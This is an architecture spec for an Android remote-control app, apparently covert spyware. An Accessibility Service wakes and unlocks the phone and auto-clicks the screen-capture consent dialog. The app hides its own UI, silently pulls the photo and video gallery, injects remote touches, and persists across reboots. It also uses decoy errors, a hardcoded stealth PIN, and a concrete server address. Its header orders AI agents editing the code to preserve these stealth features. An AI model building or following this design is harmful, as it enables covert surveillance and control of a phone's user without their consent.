# VRemote — Android Application Architecture, Features & Flow Specification (`app-flow.md`)

> **PURPOSE OF THIS SPECIFICATION:**
> This document defines the exact architecture, background waking mechanisms, WebRTC media engine, remote touch control, and lifecycle flows of the **VRemote Android Companion Application** (`remoteapk/app/`).
> Any AI agent, developer, or automated pipeline modifying, debugging, or adding code must strictly follow these rules. Under no circumstances should any change break background waking, unattended screen capture, stealth backgrounding, or hardware release.

---

## 1. High-Level Architectural Model

The VRemote Android app operates in an unattended setup (e.g. phone connected to charger in another room, screen turned off, or locked). It serves as a 24/7 remote companion controlled via the web dashboard.

```
                    ┌────────────────────────────────────────────────────────┐
                    │               Android Device (VRemote App)             │
                    ├───────────────────────────┬────────────────────────────┤
                    │   24/7 Background Engine  │   Foreground/Media Engine  │
                    │ RemoteAccessibilityService│    MainActivity & WebView  │
                    │      (mBgSocket)          │     (WebRTCCompanion)      │
                    └─────────────┬─────────────┴─────────────┬──────────────┘
                                  │                           │
                            Socket.io                   Socket.io & WebRTC
                                  │                           │
                                  ▼                           ▼
                    ┌────────────────────────────────────────────────────────┐
                    │              Node.js Server (server.js)                │
                    │               deviceRegistry (Sockets Set)             │
                    └───────────────────────────┬────────────────────────────┘
                                                │
                                          WebRTC & Sockets
                                                │
                                                ▼
                    ┌────────────────────────────────────────────────────────┐
                    │           Desktop / Laptop Web Dashboard               │
                    │          (Audio, Video, Screen, Touch, Gallery)        │
                    └────────────────────────────────────────────────────────┘
```

---

## 2. Dual Socket Model (24/7 Unattended Connectivity)

Every Android device running VRemote maintains **TWO independent socket connections**:

### A. Background Socket (`mBgSocket` in `RemoteAccessibilityService`)
- **Lifecycle:** Runs 24/7 as an Android Accessibility Service. It never dies and automatically restarts if killed.
- **Connection Policy:** Infinite reconnect retry (`opts.reconnection = true`, `reconnectionAttempts = Integer.MAX_VALUE`).
- **Registration:** Automatically registers the device via `registerDeviceBackground()` on every connect and reconnect (`role: "background_service"`).
- **Direct Background Tasks (No UI needed):**
  - Handles `get_gallery`, `get_videos`, and `get_media_detail` via `MediaBridge.java` without turning on the screen or launching any activity.
  - Handles `get_device_info` (RAM, model, platform, permanent device ID).
- **Wake & Launch Tasks:**
  - Handles `audio_call`, `video_call`, `screen_share`, and `screen_share_control` by acquiring a wake lock and launching `MainActivity`.

### B. Foreground / Companion Socket (`socket` in `WebRTCCompanion`)
- **Lifecycle:** Active when `MainActivity` is launched.
- **Role:** Handles WebRTC SDP signaling (`offer`, `answer`, `icecandidate`), live media streaming, and real-time remote touch injection.
- **Registration:** Registers device with `role: "companion"`.

---

## 3. Screen-Off & Lock-Screen Remote Waking Architecture

When an auto-command (`audio_call`, `video_call`, `screen_share`, `screen_share_control`) is received while the phone is locked or screen is off:

```
mBgSocket receives auto-command
       │
       ▼
RemoteAccessibilityService.wakeUpAndLaunch()
       │
       ├─► Acquires PowerManager.FULL_WAKE_LOCK | ACQUIRE_CAUSES_WAKEUP (15s)
       │     └─► Illuminates phone screen immediately
       │
       └─► Launches MainActivity with flags:
             └─► FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_CLEAR_TOP | FLAG_ACTIVITY_SINGLE_TOP
             └─► Passes extras: auto_command, caller, cameraChoice
```

### Inviolable Android Configuration Rules:
1. **`AndroidManifest.xml`:**
   - `.MainActivity` MUST have `android:showWhenLocked="true"` and `android:turnScreenOn="true"`.
   - Manifest MUST declare `android.permission.WAKE_LOCK` and `android.permission.DISABLE_KEYGUARD`.
   - **CRITICAL:** Do NOT add `showForAllUsers` (system-only attribute that causes `INSTALL_PARSE_FAILED_MANIFEST_MALFORMED`).
2. **`MainActivity.onCreate()` & `MainActivity.onNewIntent()`:**
   - Must call `setShowWhenLocked(true)` and `setTurnScreenOn(true)` (API >= 27).
   - Must call `KeyguardManager.requestDismissKeyguard(this, null)`.
   - Must set `FLAG_KEEP_SCREEN_ON` on the window.
3. **Cold-Start Offer Queuing (`pendingOfferPayload`):**
   - If `WebRTCCompanion` creates an offer before `socket.connected()`, the payload is queued in `pendingOfferPayload` and emitted on `Socket.EVENT_CONNECT`.

---

## 4. Stealth Mode & Immediate Backgrounding (`moveTaskToBack(true)`)

- When any remote session starts (`audio_call`, `video_call`, `screen_share`, `screen_share_control`), `MainActivity` MUST immediately call:
  ```java
  runOnUiThread(() -> moveTaskToBack(true));
  ```
- **Rule:** The VRemote application UI must **NEVER** remain visible on the phone's physical screen during unattended operations. The phone must show its normal home screen / launcher or whatever app was open.
- When `end_call` or disconnect command is received, the app must also call `moveTaskToBack(true)` to ensure it never pops up.

---

## 5. Unattended "Entire Screen" MediaProjection Auto-Accept (Android 14+)

On Android 14+ devices (including Infinix/Transsion XOS, Xiaomi MIUI/HyperOS, Samsung OneUI, and AOSP):
1. When `startScreenCaptureWithCamera` is called, `RemoteAccessibilityService.setAutoAcceptPending(true)` is armed.
2. The system displays the MediaProjection permission dialog ("Share your screen").
3. **`RemoteAccessibilityService.onAccessibilityEvent()`** automatically:
   - Detects the dialog without package name restrictions.
   - If the spinner shows "Single app", clicks the spinner, finds "Entire screen", and selects it.
   - Finds the accept button ("Start now", "Start", "ALLOW", "INICIAR AHORA") and performs `ACTION_CLICK`.
   - Completes the entire flow in under 500ms without requiring physical interaction on the phone.

---

## 6. Remote Touch & Navigation Engine

- Real-time touch commands from the web interface are received over the WebRTC DataChannel (or socket fallback).
- `handleRemoteControlMessage()` parses normalized coordinates `(x, y)`:
  - Multiplies by screen `widthPixels` and `heightPixels`.
  - Dispatches gestures via `RemoteAccessibilityService.dispatchGesture()`:
    - **Tap:** `StrokeDescription` (path with 50ms duration).
    - **Drag / Scroll:** `StrokeDescription` (line path from `(x1, y1)` to `(x2, y2)` with 250ms duration).
    - **Global Actions:** `GLOBAL_ACTION_HOME`, `GLOBAL_ACTION_BACK`, `GLOBAL_ACTION_RECENTS`, `GLOBAL_ACTION_NOTIFICATIONS`.

---

## 7. App WebView Architecture & Cache-Busting (`MainActivity.java`)

When the user opens the VRemote app manually on the phone, `MainActivity` hosts a full-featured Android WebView:

### A. Always-Fresh Loading (Zero Stale Cache)
```java
WebSettings settings = webView.getSettings();
settings.setJavaScriptEnabled(true);
settings.setDomStorageEnabled(true);
settings.setMediaPlaybackRequiresUserGesture(false);
settings.setCacheMode(WebSettings.LOAD_DEFAULT);

webView.clearCache(true);

// Cache-busting query parameter ensures WebView always executes latest HTML/CSS/JS (v=6.2)
String appLoadUrl = APP_URL + "/?v=" + System.currentTimeMillis();
webView.loadUrl(appLoadUrl);
```

### B. JavaScript Native Bridge (`VRemoteNative`)
The bridge exposes native phone capabilities to the web interface:
- `isNativeApp()`: Returns `true` so web JS adapts layout.
- `getDeviceId()`: Permanent device ID.
- `getDeviceInfo()`: JSON payload with RAM, model, and platform.
- `isAccessibilityRunning()`: Checks if `RemoteAccessibilityService` is enabled.
- `openAccessibilitySettings()`: Direct intent to Android Accessibility Settings.
- `startScreenCaptureWithCamera(target, fullControl, streamCam, camChoice)`: Starts MediaProjection + camera companion.
- `stopScreenCapture()`: Terminates projection service.
- `setCallActive(boolean)`: Tracks whether a call is active.
- `enterPip()`: Manually enters Android Picture-in-Picture mode.
- `setSpeakerphone(boolean)`: Switches between Loudspeaker and Earpiece.

### C. Web Features Rendered in App WebView:
- **Hold-to-Accept (450ms):** Incoming call phone icon requires 450ms hold to answer.
- **Decoy Error:** Quick tap/click shows `error: try after 10 minutes` and shakes the button.
- **Audio Call Mode:** Top-right camera preview box (`#local-video-container`) completely hides (`display: none !important;`).
- **Bottom Dock:** More and Settings in scrollable area; only dropdown chevron after divider.
- **Touch Hold Expand (380ms):** Expands collapsed dock with 16px touch jitter tolerance.
- **Floating End Call Button:** Positioned above dock, hidden during incoming alert to avoid overlap.

---

## 8. Strict Manual-Only Picture-in-Picture & Chat Media Isolation (No Auto-PiP)

- **Rule:** The Android app must **NEVER** enter Picture-in-Picture automatically when the home button is pressed, when switching apps, or when minimized.
- **Implementation in `MainActivity.java`:**
  - `pipBuilder.setAutoEnterEnabled(false)` (Android 12+).
  - `onUserLeaveHint()` does NOT trigger PiP.
  - PiP is entered **ONLY** when the user explicitly clicks the PiP option inside the More menu (`#more-item-pip` -> `window.VRemoteNative.enterPip()`).
- **Chat Media PiP Prohibition (Videos & Photos):**
  - Chat media (videos and photos sent/received in the Chat drawer) **MUST NEVER enter Picture-in-Picture**.
  - All chat videos run with `disablePictureInPicture = true` and `controlslist="nodownload nopip"`.
  - Android WebView does not allow PiP or custom fullscreen popups for chat videos; they must play **strictly inside the chat message bubble**.
  - Chat videos feature an animated loading progress bar (`.chat-video-progress-bar`) during buffering, which fades out once the video is ready to play directly in-chat.

---

## 9. Dynamic In-Call Audio ↔ Video Mode Switching (`WebRTCCompanion.java`)

When the caller switches between Audio and Video mode on the web dashboard:
```java
socket.on("call-mode-change", args -> {
    JSONObject data = (JSONObject) args[0];
    String mode = data.optString("mode", "");
    if ("audio".equalsIgnoreCase(mode)) {
        if (localVideoTrack != null) localVideoTrack.setEnabled(false);
    } else if ("video".equalsIgnoreCase(mode)) {
        if (localVideoTrack != null) localVideoTrack.setEnabled(true);
    }
});
```
- **Audio Mode:** Local camera video track is disabled immediately.
- **Video Mode:** Local camera video track is re-enabled.

---

## 10. Guaranteed Hardware Release on Call End (`stopAllMediaAndFinish()`)

When a call or remote session ends:
```
end-call event received from peer
       │
       ▼
WebRTCCompanion.endCall(false)
       │
       ▼
MainActivity.stopAllMediaAndFinish()
       │
       ├─► Stops and disposes camera capturers (VideoCapturer.stopCapture())
       ├─► Releases SurfaceTextureHelper
       ├─► Mutes and disposes local audio and video tracks
       ├─► Stops ScreenCaptureService
       ├─► Clears captureIntentData token
       └─► Hides activity to background (moveTaskToBack(true))
```
- **Result:** Android's green camera privacy indicator in the status bar extinguishes immediately.
- **24/7 Readiness:** `RemoteAccessibilityService` and `mBgSocket` remain running 24/7 for subsequent incoming calls.

---

## 11. Media Bridge (Gallery & Video Streaming)

- Handled in `MediaBridge.java` without launching any visible activity.
- Queries `MediaStore.Images` and `MediaStore.Video` via background threads.
- Generates compressed JPEG thumbnails (`Bitmap.CompressFormat.JPEG`, 40% quality, 1/8 sub-sampling).
- Emits chunks of 50 items (`gallery-chunk`) over `mBgSocket` to the web dashboard.
- Includes duration tags for video files.

---

## 12. Device Error Catching, Coturn TURN Traversal & Orange Failure Relay

### A. Coturn TURN Traversal (`WebRTCCompanion.java`)
To eliminate `WebRTC ICE connection failed (Network/Firewall error)` when Android devices operate on mobile cellular networks, symmetric NATs, or restrictive firewalls:
- `WebRTCCompanion` configures both UDP and TCP TURN endpoints:
  - `turn:201.18.218.29:3478?transport=udp`
  - `turn:201.18.218.29:3478?transport=tcp`
  - OpenRelay TURN backup servers (`turn:openrelay.metered.ca:80`, `443`, `tcp`)
  - Google STUN servers (`stun:stun.l.google.com:19302`)
- ICE gathering policy is explicitly set to `GATHER_CONTINUALLY` so candidates are gathered across all network interface switches.

### B. Device Error Catching & Orange Failure Relay
To provide real-time explanations on the web dashboard for why a connection did not succeed:
1. **`WebRTCCompanion.java` - `emitDeviceError(String errorMsg)`:**
   - Emits socket event `device-error` with `{ targetDeviceId: myDeviceId, error: errorMsg, from: myId }`.
   - Bound to WebRTC callbacks:
     - `onIceConnectionChange(FAILED)`: `"WebRTC ICE connection failed (Network/Firewall error)"`
     - `onCreateFailure`: `"Phone WebRTC Offer failed: " + error`
     - `onSetFailure`: `"Phone WebRTC Local SDP failed: " + error`
2. **`MainActivity.java`:**
   - Screen capture cancelled in `onActivityResult`: Emits `"Screen capture permission was cancelled on phone"`.
   - `onError`: Catches internal WebRTC / camera hardware exceptions and relays via `emitDeviceError`.
3. **`RemoteAccessibilityService.java`:**
   - Try-catch on background `PendingIntent` and activity launch: Emits `"Phone background launch failed: " + ex.getMessage()`.
4. **Offline Detection (`server.js`):**
   - If an `auto-command` cannot find target or target has no open sockets, server emits `device-error`:
     - `"Device is offline (phone app closed or background service not running)"`
     - `"Device not registered on server (app has never connected)"`
5. **In-Place UI Display on Web Dashboard:**
   - The subtitle text *"Without touching phone"* is replaced directly in-place with the exact failure reason in **clean ORANGE text (`color: #ff9f0a; font-weight: 600;`)** with NO outline and NO background box to save card vertical space.

---

## 13. 30-Minute WorkManager Background KeepAlive & Auto-Reconnection

To support all Android devices (API 21+) and guarantee connectivity even if the user or OS stops the foreground application:
1. **`KeepAliveWorker.java` (Android Jetpack WorkManager):**
   - Scheduled as a `PeriodicWorkRequest` running every 30 minutes.
   - Requires network connectivity (`NetworkType.CONNECTED`).
   - Opens a transient socket connection to `https://v.tokendeal.cloud` and emits `register-device` with `role: "keepalive_worker"`.
   - Ensures the device's entry in `deviceRegistry` on `server.js` remains fresh, active, and persistent in `devices.json`.
2. **`KeepAliveScheduler.java`:**
   - Enqueues unique periodic work (`VRemoteKeepAliveWork`) using `ExistingPeriodicWorkPolicy.KEEP`.
   - Called from `MainActivity.onCreate()`, `RemoteAccessibilityService.onServiceConnected()`, and `BootReceiver.onReceive()`.
3. **`BootReceiver.java`:**
   - Listens for `ACTION_BOOT_COMPLETED`, `QUICKBOOT_POWERON` to re-enqueue the 30-minute worker immediately upon device startup.

---

## 14. Summary of App Constraints & Build Checklist

| Component | Setting / Behavior | Requirement |
|---|---|---|
| Background Waking | `RemoteAccessibilityService` + `FULL_WAKE_LOCK` | Must illuminate screen & launch without user presence |
| 30-min KeepAlive | `KeepAliveWorker` (WorkManager) | Auto-registers device every 30 mins even if app stopped |
| Reboot Persistence | `BootReceiver` (`RECEIVE_BOOT_COMPLETED`) | Re-enqueues periodic work automatically on device boot |
| Coturn TURN | VPS Coturn `turn:201.18.218.29:3478` (UDP/TCP) | Bypasses cellular NAT/firewalls; prevents ICE failures |
| Stealth Lock PIN | `SECURITY_PIN = "7861"` (hold 1200ms) | Decoy error toast on wrong PIN/tap; bypass on `?uid=` |
| Release APK Version | `v6.4.10` (`versionCode 21`) | Reflected in build.gradle & screen share download modal |
| Stealth Mode | `moveTaskToBack(true)` on session start | Phone must never remain on VRemote UI |
| Entire Screen Auto-Accept | `setAutoAcceptPending(true)` | Clicks "Entire screen" & "Start now" in < 500ms |
| Auto-PiP | `setAutoEnterEnabled(false)` | Strictly disabled; manual click only |
| Chat Media Policy | In-chat inline playback only; no PiP | Animated sliding progress bar loader on chat videos |
| WebView Cache | `clearCache(true)` + `/?v=<timestamp>` | Always executes fresh HTML/JS/CSS |
| Hardware Release | `stopAllMediaAndFinish()` | Extinguishes green camera dot immediately on call end |
| Device Error Reporting | `emitDeviceError()` | Relays in-place orange failure reasons in real-time |
| Gradle Build | `gradle assembleRelease` on VPS | Builds release APK into `/downloads/vremote.apk` |
| Directory Sync | `public/` & `app/` | Must be 100% byte-for-byte identical at all times |
